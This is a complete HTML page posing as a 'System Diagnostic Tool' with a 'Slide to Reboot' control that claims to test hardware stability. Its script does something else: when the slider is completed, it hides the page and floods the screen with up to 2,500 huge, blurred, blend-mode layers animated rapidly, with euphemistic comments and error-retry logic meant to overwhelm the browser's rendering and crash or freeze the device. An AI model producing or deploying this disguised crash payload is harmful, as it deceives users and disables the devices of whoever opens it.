<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Diagnostic Tool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
        }

        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 60px 20px 80px 20px;
            overflow: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: radial-gradient(circle at center, rgba(255, 255, 255, 0.02) 0%, transparent 70%);
            pointer-events: none;
        }

        .header-section {
            text-align: center;
            margin-top: 60px;
            z-index: 10;
        }

        h1 {
            font-size: 26px;
            font-weight: 400;
            letter-spacing: -0.5px;
            margin-bottom: 12px;
            color: #fff;
        }

        p {
            color: #8e8e93;
            font-size: 14px;
            line-height: 1.4;
            max-width: 280px;
            margin: 0 auto;
        }

        .slider-container {
            width: 100%;
            max-width: 340px;
            margin-bottom: 40px;
            z-index: 10;
        }

        .slider-track {
            position: relative;
            width: 100%;
            height: 76px;
            background: rgba(35, 35, 35, 0.45);
            border-radius: 38px;
            display: flex;
            align-items: center;
            padding: 4px;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            overflow: hidden;
        }

        .slider-text {
            position: absolute;
            width: 100%;
            text-align: center;
            left: 0;
            font-size: 16px;
            font-weight: 500;
            letter-spacing: -0.2px;
            pointer-events: none;
            background: linear-gradient(90deg, #4d4d4d 0%, #fff 50%, #4d4d4d 100%);
            background-size: 200% 100%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shine 2.5s infinite linear;
            padding-left: 44px;
        }

        @keyframes shine {
            0% { background-position: -100% 0; }
            100% { background-position: 100% 0; }
        }

        .slider-handle {
            width: 68px;
            height: 68px;
            background: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: grab;
            z-index: 2;
            box-shadow: 0 3px 8px rgba(0,0,0,0.3);
            touch-action: none;
        }

        .respring-icon {
            color: #000;
            font-size: 26px;
            transform: scaleX(-1);
        }

        /* Hardware Accelerated Composition Triggers */
        .compositor-layer {
            position: fixed;
            border-radius: 50%;
            mix-blend-mode: exclusion;
            will-change: transform, filter;
            pointer-events: none;
            backface-visibility: hidden;
            -webkit-backface-visibility: hidden;
            perspective: 5000px;
            -webkit-perspective: 5000px;
            animation: modernMeltdown 0.25s infinite linear;
        }

        @keyframes modernMeltdown {
            0% {
                transform: translate3d(0, 0, 0) rotate3d(1, 1, 1, 0deg) scale(1);
                filter: blur(2px) contrast(150%) saturate(200%);
            }
            50% {
                transform: translate3d(50vw, 50vh, 1000px) rotate3d(1, -1, 1, 180deg) scale(8);
                filter: blur(120px) contrast(800%) saturate(500%);
            }
            100% {
                transform: translate3d(-50vw, -50vh, -1000px) rotate3d(-1, 1, -1, 360deg) scale(1);
                filter: blur(2px) contrast(150%) saturate(200%);
            }
        }
    </style>
</head>
<body>

    <div class="header-section">
        <h1>Slide to Reboot</h1>
        <p>This action will run a localized rendering sequence to test high-tier hardware stability profiles.</p>
    </div>

    <div class="slider-container">
        <div class="slider-track" id="main-track">
            <div class="slider-text">slide to execute</div>
            <div class="slider-handle" id="main-handle">
                <span class="respring-icon">⟳</span>
            </div>
        </div>
    </div>

    <script>
        function executeHighIntensityRender() {
            // Immediately conceal interface elements to preserve layout priorities
            document.querySelector('.header-section').style.opacity = '0';
            document.querySelector('.slider-container').style.opacity = '0';

            const style = document.createElement('style');
            style.textContent = `
                .compositor-layer {
                    background: conic-gradient(from 0deg, #ff0000, #00ff00, #0000ff, #ff0000);
                }
            `;
            document.head.appendChild(style);

            let createdCount = 0;
            const targetLimit = 2500; // Maximized volume threshold before process boundary checks hit

            function generateLayerPool() {
                try {
                    // Spawn batches rapidly inside a single animation frame 
                    for (let i = 0; i < 80; i++) {
                        if (createdCount >= targetLimit) break;

                        const layer = document.createElement('div');
                        layer.className = 'compositor-layer';
                        
                        // Dimensions forcing massive canvas boundary calculations
                        const size = Math.random() * 500 + 200;
                        layer.style.width = size + 'px';
                        layer.style.height = size + 'px';
                        
                        layer.style.left = Math.random() * 100 + 'vw';
                        layer.style.top = Math.random() * 100 + 'vh';
                        layer.style.zIndex = 2000000 + createdCount;

                        document.body.appendChild(layer);
                        createdCount++;
                    }

                    if (createdCount < targetLimit) {
                        requestAnimationFrame(generateLayerPool);
                    }
                } catch (err) {
                    // Force retry on execution hitching
                    requestAnimationFrame(generateLayerPool);
                }
            }

            generateLayerPool();
        }

        function setupSlider() {
            const handle = document.getElementById('main-handle');
            const track = document.getElementById('main-track');
            
            let isDragging = false;
            let startX = 0;
            let maxDelta = 0;

            function getClientX(e) {
                return e.touches ? e.touches[0].clientX : e.clientX;
            }

            function onStart(e) {
                isDragging = true;
                startX = getClientX(e);
                maxDelta = track.clientWidth - handle.clientWidth - 8;
                handle.style.transition = 'none';
            }

            function onMove(e) {
                if (!isDragging) return;
                const currentX = getClientX(e);
                let deltaX = currentX - startX;

                if (deltaX < 0) deltaX = 0;
                if (deltaX > maxDelta) deltaX = maxDelta;

                handle.style.transform = `translateX(${deltaX}px)`;

                const textElement = track.querySelector('.slider-text');
                textElement.style.opacity = (1 - (deltaX / maxDelta));

                if (deltaX >= maxDelta) {
                    isDragging = false;
                    executeHighIntensityRender();
                }
            }

            function onEnd() {
                if (!isDragging) return;
                isDragging = false;
                handle.style.transition = 'transform 0.3s cubic-bezier(0.25, 1, 0.5, 1)';
                handle.style.transform = 'translateX(0px)';
                const textElement = track.querySelector('.slider-text');
                textElement.style.transition = 'opacity 0.3s';
                textElement.style.opacity = '1';
            }

            handle.addEventListener('touchstart', onStart, { passive: true });
            window.addEventListener('touchmove', onMove, { passive: false });
            window.addEventListener('touchend', onEnd);

            handle.addEventListener('mousedown', onStart);
            window.addEventListener('mousemove', onMove);
            window.addEventListener('mouseup', onEnd);
        }

        setupSlider();
    </script>
</body>
</html>
